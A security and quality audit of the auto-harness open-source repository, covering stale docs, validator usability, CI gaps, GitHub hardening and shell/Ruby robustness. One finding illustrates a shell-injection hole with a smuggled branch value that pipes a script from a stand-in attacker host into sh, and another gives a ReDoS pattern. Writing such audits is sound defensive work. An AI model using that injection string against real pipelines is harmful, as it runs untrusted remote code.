<!--
Copyright 2026 Nate DiNiro <UncleNate@gmail.com>
SPDX-License-Identifier: MIT OR Apache-2.0
Part of auto-harness — see LICENSE-MIT and LICENSE-APACHE at repository root.
-->

# Quality Audit — 2026-05-18

**Audit scope:** public-OSS-launch readiness across five lenses.
**Methodology:** five parallel audit agents in isolated worktrees, read-only against the repo, returning structured findings; orchestrator verified sandbox-blocked items and consolidated.
**Repo state audited:** `main` at `8d6a62d` (post PRs #5–#12).
**Total findings:** 56 unique (after deduplication) — **16 high · 23 medium · 17 low**.

## Executive summary

The harness is in good shape on **secrets** (zero current-tree or git-history leaks across 115 commits), **SECURITY.md**, **license attribution** (one bad file), **shell strict-mode discipline** (all 13 scripts use `set -euo pipefail`), **BSD-vs-GNU portability** (no `tac`/`grep -P`/`stat -c`/`sed -i` in code), and **test-fixture cleanup** (all tests use `Dir.mktmpdir` block form).

It is in poor shape on **documentation–reality drift**, **validator UX for new users**, **GitHub repo hardening**, and **CI coverage**:

- The catalog kept growing through PRs #5/#6/#9/#10, but entry-point docs didn't track it. The README claims **5 skills** (actual: 7), **6 validators** (actual: 7), and links the wrong-template **`YOUR-ORG`** placeholder in its primary submodule-clone instruction. `platform/README.md` advertises **"Beta (April 2026)"** while every other entry-point says Alpha. `platform/reference/how-to-read.md` claims **"24 modules, 35 templates, 6 validators, 4 skills"** — three of four counts wrong.
- **None of the 7 validators implement `--help`.** Run `validate-X.sh --help` and you get a raw Ruby `NoMethodError` stack trace pointing into `harness_registry.rb`. This is the single biggest cliff for new users.
- **Branch protection on `main` does not exist** (`gh api .../branches/main/protection` returns 404). **Secret scanning, push protection, and validity checks are all disabled** — all four are free for public repos. The `--admin` merges we've used aren't bypassing anything because there's nothing configured to bypass.
- **CI is `ubuntu-latest` only**. The pre-existing BSD-awk bug PR #12 fixed had survived undetected for the entire lifetime of two macOS tests. **`test_install.rb` (144 assertions) is not run in CI at all** — `install.sh` has no automated regression gate.
- **`Regexp.new(user_pattern)` is called on 3 module.yaml fields with no timeout**. A shared/forked module with a catastrophic-backtracking regex would wedge `validate-companions`.
- **Markdownlint MD060 IS real** (Lane 5 agent's report was incorrect; sandbox blocked their WebFetch and they assumed the URL was 404). The rule exists in markdownlint v0.40.0 as `MD060 - Table column style` (alias `table-column-style`). Real hit count across entry-point + workflow markdown alone: **68**. The user's earlier flag was correct.

## Triage — recommended first three follow-up branches

If you fix nothing else from this report, fix these three. Each is small, mechanical, and high-leverage.

### 1. `fix/stale-catalog-counts` — Severity: high, effort: low

Reconcile every "N skills / N validators / N modules / N templates" claim across `README.md`, `HARNESS.md`, `AGENTS.md`, `platform/README.md`, `platform/reference/how-to-read.md`, `platform/workflow/skills-and-agents.md`, `platform/workflow/submodule-integration.md`, and the two sample-project release-checklist/milestones files. Add the three missing compositions to README's starter table (`interview-driven-discovery.yaml`, `mcp-server-typescript.yaml` — `agentic-ui-saas.yaml` is already there). Fix the broken `validate-companions` command at `README.md:148` (missing `.` project-root arg). Replace `YOUR-ORG` with `unclenate` in all three locations. Bundle the `platform/README.md` "Beta (April 2026)" → "Alpha" change to match every other entry-point. **Findings: L1-02, L1-03, L1-04, L1-05, L1-06, L4-01, L4-04, L4-05, L4-13.**

### 2. `fix/validator-usability` — Severity: high, effort: low–medium

Add uniform `--help` / `-h` short-circuit to all 7 validators (currently zero have it; running with `--help` produces raw Ruby stack traces). Adopt 3-state exit codes consistently with `install.sh` (`0`=pass, `1`=violations found, `2`=usage/dependency error). Wrap manifest-load with a typed error so empty/malformed YAML produces `✗ Manifest is empty or not a YAML mapping` instead of `NoMethodError`. Add macOS bash-4 + `brew install bash` prerequisite warning to README's "Integrating into Your Repo" section. **Findings: L4-02, L4-03, L2-04, L2-05.**

### 3. `fix/repo-hardening-and-ci-matrix` — Severity: high, effort: medium

Enable branch protection on `main` (require Validators + Self-Tests + Bootstrap-Tests checks, require linear history, no force-push, no deletion). Enable secret scanning + push protection + validity checks (free for public repos). Enable auto-delete head branches after merge. Add `macos-latest` to the CI matrix and add a `bootstrap-tests` job invoking `test_install.rb` + `test_link_skills.rb`. Add `.github/CODEOWNERS` (`* @unclenate`) and `.github/dependabot.yml` (github-actions ecosystem, weekly). **Findings: L3-04, L2-01, L2-02, L1-10, L1-11.**

The rest of the report's findings are real but lower-leverage; address them as bandwidth allows.

---

## Findings

Severity rubric: **high** = embarrassing if found by a stranger / breaks correctness / silent failure of a security control. **medium** = legitimate concern, not blocking. **low** = polish.

Lane sources are noted where a finding was surfaced by multiple agents.

### Lane 1 — Public-launch embarrassment risk

#### Finding L1-01 (also L3-01): Wrong email in `add-license-headers.sh` lines 2 and 34 — Severity: high

**Where:** `platform/bootstrap/add-license-headers.sh:2,34`
**Evidence:** Line 2 is `# Copyright 2026 Nate DiNiro <nate@bdits.io>` and line 34 sets `AUTHOR='Nate DiNiro <nate@bdits.io>'`. `nate@bdits.io` is the work email; OSS attribution must be `UncleNate@gmail.com`. The script is the *propagation engine* for SPDX headers — if re-run with `--apply` against any new file, every file would land with the wrong email. Repo-wide `grep -rn "nate@bdits.io"` confirms only this one file is currently contaminated; all 90+ existing headers carry the correct email.
**Recommendation:** Replace both occurrences with `UncleNate@gmail.com` and add a CI guard greppin̄g for `nate@bdits.io` that fails the build.

#### Finding L1-02: `platform/README.md` says "Beta (April 2026)" while every other entry-point says Alpha — Severity: high

**Where:** `platform/README.md:13`
**Evidence:** Line 13 reads `**Version:** Beta (April 2026)`. `HARNESS.md:15` says `Maturity: Platform (Alpha)`. `README.md:10` renders a `Status-Alpha` badge. `SECURITY.md:15` says "alpha maturity". A reader who lands on GitBook (which uses `platform/README.md`) sees a more mature label than the project actually claims.
**Recommendation:** Pick one canonical maturity label and propagate. Likely "Alpha, pre-1.0" to match the other surfaces.

#### Finding L1-03 (also L4-13): README claims "five skills" — there are seven — Severity: high

**Where:** `README.md:310` and the immediately-following installation table; same stale claim at `platform/workflow/skills-and-agents.md:99`.
**Evidence:** README line 310 says "The harness provides five skills..." Table lists 5. Actual count on disk: 7 (`harness-governance`, `-onboarding`, `-tools`, `-testing`, `-web3`, `harness-agentic-interfaces`, `harness-mcp`). `AGENTS.md:145` and `CLAUDE.md:24-35` correctly say seven; `SUMMARY.md:159` lists all seven. The omitted skills are governance overlays for two whole architectures the project advertises (`architectures/agentic-ui`, `architectures/mcp-server`).
**Recommendation:** Update README + skills-and-agents.md to reflect seven, including the table.

#### Finding L1-04 (also L4-05): README claims "Six validators" — there are seven — Severity: high

**Where:** `README.md:343`; also `platform/workflow/submodule-integration.md:28`; also sample-project artifacts `platform/examples/sample-projects/{submodule-consumer,node-web-saas-postgres}/docs/{project/milestones.md,ops/release-checklist.md}`.
**Evidence:** README line 343 says "Six validators". Actual count on disk: 7 (`validate-doc-references.sh` missing from the README table; PR #10 added it). `.github/workflows/harness.yml:43` runs all seven. `platform/validators/README.md:35` correctly documents seven. Sample-project artifacts ship to users; out-of-date counts mislead new adopters.
**Recommendation:** Update README + submodule-integration.md to seven; either fix the sample-project artifacts or label them as historical snapshots.

#### Finding L1-05: Submodule-clone instructions ship with `YOUR-ORG` placeholder URL — Severity: high

**Where:** `README.md:439`, `platform/workflow/submodule-integration.md:37`, `:44`.
**Evidence:** All three locations contain `git submodule add https://github.com/YOUR-ORG/auto-harness .harness`. A stranger copy-pasting the recommended adoption command from README's "Integrating into Your Repo" section hits 404. The correct URL appears elsewhere in the same files.
**Recommendation:** Replace `YOUR-ORG` with `unclenate` in all three locations. If the intent is to invite forks, surround with explicit "replace with your fork" instructions on the same line.

#### Finding L1-06: `platform/reference/how-to-read.md` advertises stale counts — Severity: high

**Where:** `platform/reference/how-to-read.md:10`.
**Evidence:** Line 10 reads "The harness documentation is large — 24 modules, 35 templates, 6 validators, 4 skills — but most readers need only a narrow slice at any given time." Actual: 7 validators, 7 skills. Module + template counts not separately verified here but likely also stale given the catalog growth pattern across PRs #5/#6/#9/#10.
**Recommendation:** Recompute and update all four numbers. Consider scripting it: a tiny `tools/refresh-catalog-counts.sh` that updates the line automatically, gated by CI.

#### Finding L1-07: `docs/project/dependency-log.md` pins Ruby ≥ 2.7 while CI uses 3.3 — Severity: medium

**Where:** `docs/project/dependency-log.md:17`.
**Evidence:** Line 17: `Ruby (>= 2.7)`. Every other surface (`CONTRIBUTING.md:46`, `platform/validators/README.md:16`, `platform/workflow/submodule-integration.md:28`, `.github/workflows/harness.yml:22,61` which pins `ruby-version: "3.3"`) says 3.0+ or pins 3.3. Ruby 2.7 reached end-of-life in 2023.
**Recommendation:** Update dependency-log.md to match — minimum 3.0, CI pins 3.3.

#### Finding L1-08: `platform/validators/README.md` self-contradicts on Bash version — Severity: medium

**Where:** `platform/validators/README.md:18`.
**Evidence:** Line 18 reads "**Bash 4+** — standard on Linux; macOS ships Bash 3 but the scripts are compatible." Either the scripts require Bash 4 (consistent with `install.sh:61` which actively refuses Bash 3) or they're Bash-3-compatible — cannot be both. A reader on macOS reading this line concludes no Homebrew install is needed; reading `install.sh` they learn the opposite.
**Recommendation:** Clarify: the `validate-*.sh` scripts work on Bash 3 (they delegate to Ruby); only `install.sh` requires Bash 4. Or unify around 4+ and tell macOS users to install via Homebrew.

#### Finding L1-09: No `CHANGELOG.md` at the repo root — Severity: medium

**Where:** repo root.
**Evidence:** A pre-1.0 project with 12 merged PRs and ADRs 0001–0008 has no externally-facing release log. `docs/project/change-log.md` exists but is project-internal.
**Recommendation:** Add a top-level `CHANGELOG.md` (Keep-a-Changelog format) summarizing externally-visible changes. Backfill from `git log`'s squash-merge subjects.

#### Finding L1-10: No `.github/CODEOWNERS` — Severity: medium

**Where:** `.github/`.
**Evidence:** Absent. Repo declares `@unclenate` as owner in `HARNESS.md` and `AUTHORS`, but GitHub's review-request automation depends on CODEOWNERS.
**Recommendation:** Add minimal `.github/CODEOWNERS` with `* @unclenate` (and future co-maintainers).

#### Finding L1-11: No `.github/dependabot.yml` — Severity: medium

**Where:** `.github/`.
**Evidence:** Absent. CI pins `actions/checkout@v4` and `ruby/setup-ruby@v1` — will eventually need updates. Dependabot security updates ARE enabled at the repo level (per `gh api`), but no `dependabot.yml` config means version-update PRs don't get raised.
**Recommendation:** Add minimal `dependabot.yml` covering `github-actions` ecosystem at weekly cadence.

#### Finding L1-12: `legacy/` directory shipped without a README explaining why — Severity: low

**Where:** `legacy/`.
**Evidence:** README and AGENTS.md mention it as "Archived historical files" / "Treat as historical or test data," but the directory itself has no in-place README. A new contributor browsing GitHub sees an unexplained top-level `legacy/`.
**Recommendation:** Add one-paragraph `legacy/README.md` stating provenance and that nothing inside is canonical.

#### Finding L1-13: No `.github/FUNDING.yml` — Severity: low

**Where:** `.github/`.
**Evidence:** Absent. For a solo-maintained OSS framework, GitHub Sponsors integration is a small signal of long-term maintenance intent.
**Recommendation:** Add if you want to accept sponsorship; otherwise leave — absence is noticeable but cosmetic.

#### Finding L1-14: Profile READMEs link to skill directories instead of `SKILL.md` files — Severity: low

**Where:** Several profile READMEs end with bullet links like `[platform/skills/harness-mcp/](../../../skills/harness-mcp/)` (trailing slash, directory). Verified-on-disk resolution works, but GitBook expects a `README.md` in directory-target links and the skill directories contain only `SKILL.md`.
**Recommendation:** Point links at the specific `SKILL.md` file, or add tiny `README.md` redirects in each skill directory.

#### Finding L1-15: Audit method limitation — sub-agent sandbox blocked external URL curl-checks — Severity: low (informational)

**Where:** Audit methodology.
**Evidence:** Lane 1 agent's sandbox denied `curl` and `gh` Bash invocations; only `agentskills.io/specification` could be verified via `WebFetch`. Orchestrator filled the gap: 11 high-traffic external URLs sampled — all returned 200. Full external-URL list not exhaustively scanned.
**Recommendation:** Run `curl -sSLI` over the full URL inventory (extracted by Lane 1) from a network-enabled environment, or add a CI link-check step (`lychee` or similar) on a weekly schedule.

#### Finding L1-16: Duplicate Contributor-Covenant URL appearances in `CODE_OF_CONDUCT.md` — Severity: low

**Where:** `CODE_OF_CONDUCT.md:11,48`.
**Evidence:** URL extraction caught a doubled `](https://...)` pattern characteristic of markdown autolinks. Renders fine; cosmetic.
**Recommendation:** No action required unless aiming for cleanest GitBook rendering.

#### Finding L1-17: SPDX header missing from `docs/opportunities/OPP-0001-...md` — Severity: low

**Where:** `docs/opportunities/OPP-0001-exportable-governance-contract-for-runtime-harnesses.md`.
**Evidence:** Surfaced by Lane 1 agent as a side note. OPP-0001 lacks both the SPDX header *and* the exclusion pattern that covers OPP-0002 and OPP-0003 in `add-license-headers.sh`. Easy miss.
**Recommendation:** Add the SPDX header (it's the first opportunity record and was authored before the header sweep landed).

### Lane 2 — Code correctness & robustness

#### Finding L2-01: CI matrix is `ubuntu-latest`-only — Severity: high

**Where:** `.github/workflows/harness.yml:14,55`.
**Evidence:** Both jobs hard-code `runs-on: ubuntu-latest`. The BSD `awk -v` multi-line bug fixed in PR #12 had survived undetected for the entire lifetime of two macOS-only tests because CI never ran on macOS. 100% of the project's primary consumer install path is macOS (per `install.sh:60` which preflight-checks for Bash 4 against macOS's default 3.2), yet 0% of CI exercises it.
**Recommendation:** Add `runs-on: [ubuntu-latest, macos-latest]` matrix to both jobs. macos-latest has Bash 4+ pre-installed; `test_install.rb` will need a Homebrew bash setup step.

#### Finding L2-02: `test_install.rb` (23 classes / 144 assertions) and `test_link_skills.rb` are not run in CI — Severity: high

**Where:** `.github/workflows/harness.yml:53-75`.
**Evidence:** Only `test_harness_registry.rb` and `test_validators_integration.rb` are invoked. `platform/bootstrap/test/test_install.rb` and `test_link_skills.rb` cover `install.sh` + `link-skills.sh` (the consumer entrypoints) and are never run by the pipeline. Today's PR #12 bonus fix (BSD awk) was caught only because the agent ran the suite locally.
**Recommendation:** Add a `bootstrap-tests` job in `harness.yml`. Pair with L2-01's macOS matrix expansion.

#### Finding L2-03: No shellcheck in CI; 1,571 lines of bash unlinted — Severity: high

**Where:** `.github/workflows/harness.yml`.
**Evidence:** 13 `.sh` files (1,571 lines) have no static analysis step. Spot inspection from Lane 2 found at least one SC2086 candidate at `install.sh:540` (`$force_flag` unquoted in command position — see L2-12 / L3-06). Sandbox blocked the agent from running shellcheck directly; orchestrator confirms shellcheck not installed on the local dev environment either.
**Recommendation:** Add a workflow step: `shellcheck -x platform/**/*.sh`. Configure `.shellcheckrc` if specific SC codes get noisy.

#### Finding L2-04: Validators emit raw Ruby `NoMethodError` stack traces on malformed input — Severity: high

**Where:** `platform/validators/lib/harness_registry.rb:45` (`manifest.fetch(...)`); `platform/validators/validate-manifest.sh:20` (`manifest["schemaVersion"]`); all 7 validators dereferencing manifest.
**Evidence:** Verified by orchestrator: `echo '' | xargs -I{} bash validate-manifest.sh {}` → `undefined method '[]' for nil (NoMethodError)`. Same hazard repeats in every validator that calls `HarnessRegistry.load_manifest` and dereferences without type guards.
**Recommendation:** In `HarnessRegistry.load_manifest`, raise typed error `"Manifest must be a YAML mapping (got #{data.class})"`. Rescue in validator shells and emit `✗ <message>` + `exit 2`.

#### Finding L2-05: Validators inconsistently exit (1 for both usage errors and violations) — Severity: high

**Where:** All 7 validators in `platform/validators/*.sh`.
**Evidence:** `install.sh` adopted a 3-state exit convention in PR #12 (`0`=clean, `1`=blocking, `2`=usage). Verified: `validate-X.sh --help` returns exit `1` for most validators and `2` for `validate-placeholders.sh` — inconsistent. Consumer CI can't distinguish "you passed the wrong argument" from "your repo violated governance" — both block the same way.
**Recommendation:** Adopt `0`/`1`/`2` across all validators: `exit 2` for "I cannot run" (missing argument, missing dependency, unreadable manifest); reserve `exit 1` for "I ran and found violations."

#### Finding L2-06: `changed_files` swallows git errors and conflates "git failed" with "no changes" — Severity: medium

**Where:** `platform/validators/lib/harness_registry.rb:105-123`.
**Evidence:** Both backtick calls suppress stderr with `2>/dev/null` and the result is treated as empty when the diff command fails (not a git repo, bad base ref, etc.). `validate-companions.sh:31-34` then prints `"No changed files detected... Skipping companion validation."` and exits 0 — **silently disabling enforcement.**
**Recommendation:** Capture stderr separately, check `$?.success?` on each backtick. If git itself fails, raise/exit 2.

#### Finding L2-07 (also L3-02): ReDoS surface — `Regexp.new(user_pattern)` with no timeout — Severity: medium

**Where:** `platform/validators/lib/harness_registry.rb:126,134,187`.
**Evidence:** Three call sites compile user-supplied strings from `module.yaml`'s `companionRules.{triggerPaths,requiredAny,forbiddenPatterns}` (and from `.doc-reference-ignore`) into `Regexp.new(pattern)`. No length cap, no timeout, no validation. Ruby's regex engine is recursive-backtracking; a hostile module like `forbiddenPatterns: ['(a+)+$']` against a long matching input can wedge the validator. `Regexp.timeout=` (Ruby 3.2+) is not set anywhere.
**Recommendation:** Set a global `Regexp.timeout = 1.0` at the top of `harness_registry.rb` (one line, no behavior change for sane patterns). Optionally add a manifest-validator check rejecting patterns >200 chars or containing nested quantifiers like `(.+)+`.

#### Finding L2-08: `realpath --relative-to=` silently falls through on macOS without coreutils — Severity: medium

**Where:** `platform/bootstrap/install.sh:119-123`.
**Evidence:** `command -v realpath` returns true on modern macOS (system `realpath` exists), but `--relative-to=` is a GNU coreutils flag. macOS `realpath` doesn't support it → call fails → fallback to `MOUNT_PATH=".harness"`. The intent (auto-detect from script location) is silently never triggered on the project's primary platform.
**Recommendation:** Replace with a pure-bash relative-path computation, or detect GNU realpath specifically (`realpath --version 2>&1 | grep -q GNU`).

#### Finding L2-09: `YAML.safe_load` shape errors not consistently guarded in `validate-manifest.sh` — Severity: medium

**Where:** `platform/validators/validate-manifest.sh:17-48`.
**Evidence:** Lines 27/40: `module_groups = manifest["modules"]`, `overrides = manifest["overrides"]`. If `manifest["modules"]` is a String (`modules: foo` instead of a hash), the subsequent `module_groups.keys` raises `NoMethodError`. The errors-array pattern catches *some* type errors but not all.
**Recommendation:** Guard each shape assertion before drilling deeper; collect errors rather than crashing.

#### Finding L2-10: `--mount-path` accepts `..` traversal — Severity: medium

**Where:** `platform/bootstrap/link-skills.sh:60`, `platform/bootstrap/install.sh:131`.
**Evidence:** Both only reject absolute paths. `--mount-path ../some-other-repo` is accepted; symlinks would point outside the project tree. Not strictly a security issue but produces unrecoverable broken state if the sibling moves.
**Recommendation:** Reject patterns containing `..` segments.

#### Finding L2-11: `validate-placeholders.sh` silences `rg` stderr; diagnostic is opaque — Severity: medium

**Where:** `platform/validators/validate-placeholders.sh:28-43`.
**Evidence:** Lines 28/30 send rg stderr to `/dev/null`. When STATUS is neither 0 nor 1 (e.g., 2 = bad regex / IO error), the script prints `✗ Placeholder validation failed to run cleanly` with no further detail. User has no diagnostic path.
**Recommendation:** Capture stderr to a variable; on non-{0,1} status, echo it before exiting.

#### Finding L2-12 (also L3-06): `$force_flag` is unquoted in `install.sh` — Severity: medium

**Where:** `platform/bootstrap/install.sh:540`.
**Evidence:** `link_out="$(bash "$link_sh" --project-root "$PROJECT_ROOT" --mount-path "$MOUNT_PATH" $force_flag "${skill_args[@]}" 2>&1)"`. Today the variable is `""` or `--force` (safe), but it's the canonical fragile shell pattern that shellcheck flags (SC2086) and would break if the value ever held whitespace.
**Recommendation:** Convert to a proper array: `force_flag=(); $FORCE && force_flag=(--force)`; use `"${force_flag[@]}"`.

#### Finding L2-13: `smoke_test_validators` added without test coverage — Severity: medium

**Where:** `platform/bootstrap/install.sh:605-630` vs `platform/bootstrap/test/test_install.rb`.
**Evidence:** Grepping `smoke_test_validators` in the test file returns no hits. The function suppresses its own validator exit codes via `set +e` and converts non-zero into a `FOLLOWUPS+=` entry. Without a test, regressions (e.g., validator path moves) silently degrade to "missing follow-up".
**Recommendation:** Add a test class injecting a deliberately-broken composition into a tmpdir mount and asserting the follow-up text appears in stdout.

#### Finding L2-14: `expected_target` comparison brittle to trailing-slash `--mount-path` — Severity: low

**Where:** `platform/bootstrap/link-skills.sh:103,107`.
**Evidence:** With `--mount-path .harness/`, the symlink is created with `//` but `readlink` returns normalized form, so re-runs always trigger `[REPLACED]`.
**Recommendation:** Normalize `MOUNT_PATH="${MOUNT_PATH%/}"` once after flag parse.

#### Finding L2-15: `extract_field` (install.sh:255) — regex concatenation with caller-supplied field — Severity: low

**Where:** `platform/bootstrap/install.sh:258`.
**Evidence:** `$0 ~ "^  " f ":"` where `f` is currently one of `id|name|maturity|criticality` (literals). Safe today, but anyone adding a new identity field with regex metacharacters in the name silently produces broken matching.
**Recommendation:** Add a comment pinning the contract, or `gsub` regex-metas in `f` before interpolation.

#### Finding L2-16: `print_usage` couples `--help` to comment-block formatting — Severity: low

**Where:** `platform/bootstrap/install.sh:93`, `platform/bootstrap/link-skills.sh:44`.
**Evidence:** `sed -n '2,/^$/{s/^# \{0,1\}//;p;}' "$0" | sed '/^!/d'`. Future SPDX header insertions (add-license-headers.sh already added 3 lines at line 2) shifted the usage block — verified still works because the SPDX block stops at `/^$/`. Worth a contract comment.
**Recommendation:** Add `# DOCS-CONTRACT: print_usage depends on the comment block here` note.

### Lane 3 — Security posture

#### Finding L3-04: GitHub repo hardening is broadly disabled — Severity: high

**Where:** `gh api repos/unclenate/auto-harness` + `gh api .../branches/main/protection`.
**Evidence (orchestrator-verified):**

- **Branch protection on `main`: 404 (not configured).** Every `--admin` merge today bypassed nothing because there was nothing to bypass.
- `secret_scanning: disabled`, `secret_scanning_push_protection: disabled`, `secret_scanning_non_provider_patterns: disabled`, `secret_scanning_validity_checks: disabled`. All four are **free for public repos**.
- `delete_branch_on_merge: false`. The session has been manually cleaning up worktree branches; auto-delete would handle this.
- `allow_merge_commit: true` — allows non-squash merges, inconsistent with the squash-merge workflow used today.
- `dependabot_security_updates: enabled` (only good thing in this category).
**Recommendation:** Enable branch protection on `main` (require Validators + Self-Tests checks, require linear history, no force-push, no deletion). Enable all four secret-scanning features. Enable auto-delete head branches. Disable `allow_merge_commit` and `allow_rebase_merge` to match the squash-merge convention.

#### Finding L3-03: `base_branch` argument flows unescaped into shell interpolation — Severity: medium

**Where:** `platform/validators/lib/harness_registry.rb:108-109`.
**Evidence:** `output = \`git diff --name-only origin/#{base_branch}...HEAD 2>/dev/null\`` — `base_branch` is `ARGV[3]` of `validate-companions.sh`. A consumer invoking the validator from CI with a parameterized base branch (`bash validate-companions.sh "$manifest" "$root" "$INPUT_BASE_BRANCH"`) and a tainted`INPUT_BASE_BRANCH` like `main; curl evil.com/x | sh` would execute arbitrary shell. Most consumers hardcode `main`; the risk surfaces in CI configurations reading the base branch from PR metadata.
**Recommendation:** Use`Open3.capture2("git", "diff", "--name-only", "origin/#{base_branch}...HEAD")` with arg-list (no shell). At minimum validate `base_branch =~ /\A[A-Za-z0-9._\/-]+\z/`.

#### Finding L3-07: `--skills` argument comma-split without per-token sanitization — Severity: low

**Where:** `platform/bootstrap/install.sh:527`, then `link-skills.sh:54`.
**Evidence:** `IFS=',' read -r -a skill_args <<< "$SKILLS"` then positionally passed to `link-skills.sh`. `link-skills.sh:54` has a `--*) die "unknown flag" ;;` guard catching double-dash flags, but a single-dash token like `-rf` falls through to `*)` and gets appended to `SKILL_NAMES`, then fails harmlessly when `[[ -d ".harness/platform/skills/-rf" ]]` returns false. Safe by accident, not validation.
**Recommendation:** Add per-token regex `[[ "$tok" =~ ^[a-z0-9_-]+$ ]] || die "invalid skill name: $tok"` immediately after the split. ~3 lines.

#### Finding L3-08 (informational): Git-history secrets scan clean — Severity: low

**Where:** `git log --all --pickaxe-regex -S` across 115 commits.
**Evidence:** Lane 3 ran patterns for AWS keys, GitHub/Slack/Discord/GitLab tokens, JWTs, private keys, bearer tokens, password assignments, personal paths. Zero true-positive secrets. The two `nate@bdits.io` historical hits and one `risk-` substring false-positive are accounted for.
**Recommendation:** No revocation needed. Consider adding `gitleaks` or `trufflehog` as a pre-push hook to keep history clean going forward.

### Lane 4 — Onboarding / UX friction

#### Finding L4-01: README's `validate-companions` command is missing project-root arg — Severity: high

**Where:** `README.md:148`.
**Evidence (orchestrator-verified):** `bash platform/validators/validate-companions.sh harness.manifest.yaml main` — the script's signature is `<manifest> <project-root> <base-branch>`. Currently `main` is interpreted as `PROJECT_ROOT` and `BASE_BRANCH` defaults silently. AGENTS.md:57 has it right. Copy-paste from README's prominent "Run the validators" block crashes. Same class of bug as PR #8's bootstrap-quickstart fix — the broken pattern migrated to the README.
**Recommendation:** README line 148 should read `bash platform/validators/validate-companions.sh harness.manifest.yaml . main`.

#### Finding L4-02: install.sh requires Bash 4 but README/quickstart never warn macOS users — Severity: high

**Where:** `platform/bootstrap/install.sh:60-70` (preflight); `README.md` "Integrating into Your Repo"; `platform/workflow/bootstrap-quickstart.md`.
**Evidence:** `install.sh` aborts on macOS's default `/bin/bash` (3.2). Only `platform/workflow/submodule-integration.md:27` mentions this prereq. Mac users following the README front-door path hit "Bash 4+ required" before they get anywhere.
**Recommendation:** Pull the Bash-4 + `brew install bash` note up into README's "Integrating into Your Repo" section and into bootstrap-quickstart's "What You Need" list.

#### Finding L4-03: None of the 7 validators implement `--help` — Severity: high

**Where:** All `platform/validators/validate-*.sh`.
**Evidence (orchestrator-verified):** `bash validate-X.sh --help` for several validators emits raw Ruby stack traces pointing into `/Users/unclenate/auto-harness/platform/validators/lib/harness_registry.rb:19:in 'IO.read': No such file or directory @ rb_sysopen - --help (Errno::ENOENT)`. Some validators return exit 1, some return exit 2, all are unfriendly. The user must read source to learn the signature.
**Recommendation:** Add uniform `--help` / `-h` short-circuit at the top of every validator printing purpose, args, one usage example. Pair with L2-05 exit-code normalization.

#### Finding L4-04: README starter-compositions table is missing two real compositions — Severity: high

**Where:** `README.md:252-261` and `platform/compositions/README.md:21-28`.
**Evidence (orchestrator-verified):** `ls platform/compositions/*.yaml` shows 9 manifests. README table lists 7 + 1 (`agentic-ui-saas.yaml` is present). Missing from README table: `interview-driven-discovery.yaml` and `mcp-server-typescript.yaml`. `platform/compositions/README.md` also outdated. A consumer browsing the table will not discover the composition that matches their stack.
**Recommendation:** Regenerate both tables from the directory listing. Add a CI check (or a `validate-doc-references`-adjacent linter) that fails when a composition file exists without a row in both tables.

#### Finding L4-06: bootstrap-quickstart never instructs running validate-companions or validate-doc-references — Severity: medium

**Where:** `platform/workflow/bootstrap-quickstart.md` Steps 2–6.5.
**Evidence:** Quickstart enumerates `validate-manifest`, `validate-module-graph`, `validate-required-artifacts`, `validate-placeholders`, `validate-agent-pack` — and stops. "Harness Bootstrap Complete" criteria (line 257-265) require only those four. Consumers following it will not exercise companion-rule enforcement or catch broken doc references.
**Recommendation:** Add final step running the remaining validators, or split out a "CI-only validators" note explaining they're not part of local bootstrap.

#### Finding L4-07: `add-license-headers.sh` has no `--help`; `--help` silently runs in dry-run mode — Severity: medium

**Where:** `platform/bootstrap/add-license-headers.sh:39-41`.
**Evidence:** Only `--apply` recognized. Running `--help` skips the if-branch silently and walks every tracked file emitting `[shell] / [markdown] / [yaml] / [ruby]` dry-run output — confusing for a user who just wanted usage.
**Recommendation:** Add explicit `--help`/`-h` case printing the usage block already documented in the leading comment.

#### Finding L4-08: `submodule-consumer` sample manifest is verbatim duplicate of `node-web-saas-postgres`'s — Severity: medium

**Where:** `platform/examples/sample-projects/submodule-consumer/harness.manifest.yaml` vs `platform/examples/sample-projects/node-web-saas-postgres/harness.manifest.yaml`.
**Evidence (orchestrator-verified):** `diff` between the two files returns empty — bit-identical. Both declare `project.id: node-web-saas-postgres`, `project.name: Node Web SaaS Postgres`, identical modules. A consumer expecting a submodule-mounted sample sees a manifest that doesn't reflect submodule mode at all.
**Recommendation:** Give submodule-consumer its own `project.id`/`name` (e.g. `submodule-consumer-sample`) and update modules to differentiate the mounting story.

#### Finding L4-09: Discovery rubric does not lead to `research-pipeline-python-object-storage` composition — Severity: medium

**Where:** `platform/workflow/discovery-to-composition.md:198-218` (Step 6 decision matrix) and `platform/compositions/research-pipeline-python-object-storage.yaml`.
**Evidence:** Step 6 matrix maps "Media processing pipeline? (§5.1)" → `domains/media-pipeline`. A "Python data pipeline producing reports" project has no row in the matrix. The composition exists (README's table lists it for "Data / ML pipeline") but the rubric never points there. Following the matrix produces `python` + (no architecture row fits) + `object-storage` + `prototype`, NOT the actual composition (which uses `event-driven` + `media-pipeline`).
**Recommendation:** Add a "Data / ML pipeline?" row to the Step 6 matrix mapping to `architectures/event-driven` + `data/object-storage`, and surface `research-pipeline-python-object-storage.yaml` as the matching starter.

#### Finding L4-10: `research-pipeline` composition uses undocumented `maturity: research` — Severity: medium

**Where:** `platform/compositions/research-pipeline-python-object-storage.yaml:7`.
**Evidence:** Quickstart says `maturity: prototype | mvp | production`. `validate-manifest.sh` only checks for non-empty. `platform/core/registry/manifest.schema.json:24-27` allows any non-empty string. So `research` passes validation but is undocumented. Same with `criticality`: schema enum has 7 values (`low | medium | high | critical | platform | research | internal`), README documents only 4.
**Recommendation:** Either tighten the schema/validator to documented enums, or expand README/quickstart to enumerate every accepted value with use cases.

#### Finding L4-11: bootstrap-quickstart's `$PLATFORM` variable is undocumented — Severity: medium

**Where:** `platform/workflow/bootstrap-quickstart.md:68-69`.
**Evidence:** Step 2 introduces `PLATFORM=path/to/platform` with no explanation of what to substitute when the harness is a submodule vs sibling vs copied-in. The rest of the doc uses `$PLATFORM` everywhere. Ambiguous even in submodule-mode (is it `./platform`? `./.harness/platform`?).
**Recommendation:** Show the literal expected value (`PLATFORM=./platform` for copy-mode, `PLATFORM=./.harness/platform` for submodule-mode) at the top of Step 2.

#### Finding L4-12: `link-skills.sh --help` prints SPDX header as part of usage — Severity: low

**Where:** `platform/bootstrap/link-skills.sh:42-45` (`print_usage`).
**Evidence:** Same `sed -n` trick as install.sh, but link-skills.sh has no blank line between SPDX header and the substantive usage block. `--help` output starts with three lines of copyright noise.
**Recommendation:** Add a blank line between SPDX header and `# link-skills.sh — ...`, OR change `print_usage` regex to start from the `Usage:` line.

#### Finding L4-14: AGENTS.md First-Session step 2 doesn't say which command — Severity: low

**Where:** `AGENTS.md:22`.
